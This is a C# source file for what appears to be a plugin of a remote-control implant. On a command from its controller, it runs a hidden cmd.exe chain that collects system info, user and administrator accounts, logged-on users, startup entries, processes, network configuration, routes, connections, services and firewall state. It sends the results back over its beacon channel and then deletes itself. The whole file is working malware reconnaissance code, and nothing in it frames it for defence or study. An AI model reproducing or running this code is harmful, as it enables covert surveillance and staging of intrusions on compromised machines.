using Beacon.MessagePackLib;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace cc
{
    public static class Packet
    {
        public static void Read(BeaconMsgPack unpack_msgpack)
        {
            Console.WriteLine("Plugin Information Read");
            try
            {
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "information":
                        {
                            Plugin.SendFramed(InformationList(unpack_msgpack.ForcePathObject("CID").AsString));
                            Plugin.Destroy();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message, unpack_msgpack.ForcePathObject("CID").AsString);
            }
        }
        public static void Error(string ex, string CID)
        {
            BeaconMsgPack msgpack = new BeaconMsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("CID").AsString = CID;
            msgpack.ForcePathObject("Error").AsString = ex;
            Plugin.SendFramed(msgpack.Encode2Bytes());
        }
        public static byte[] InformationList(string CID)
        {
            string back = execCMD(@"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config");
            BeaconMsgPack msgpack = new BeaconMsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Information";
            msgpack.ForcePathObject("CID").AsString = CID;
            msgpack.ForcePathObject("InforMation").AsString = back;
            return msgpack.Encode2Bytes();
        }

        public static string execCMD(string command)
        {
            System.Diagnostics.Process pro = new System.Diagnostics.Process();
            pro.StartInfo.FileName = "cmd.exe";
            pro.StartInfo.UseShellExecute = false;
            pro.StartInfo.RedirectStandardError = true;
            pro.StartInfo.RedirectStandardInput = true;
            pro.StartInfo.RedirectStandardOutput = true;
            pro.StartInfo.CreateNoWindow = true;
            //pro.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            pro.Start();
            pro.StandardInput.WriteLine(command);
            pro.StandardInput.WriteLine("exit");
            pro.StandardInput.AutoFlush = true;
            //获取cmd窗口的输出信息
            string output = pro.StandardOutput.ReadToEnd();
            pro.WaitForExit();//等待程序执行完退出进程
            pro.Close();
            return output;

        }


    }

}
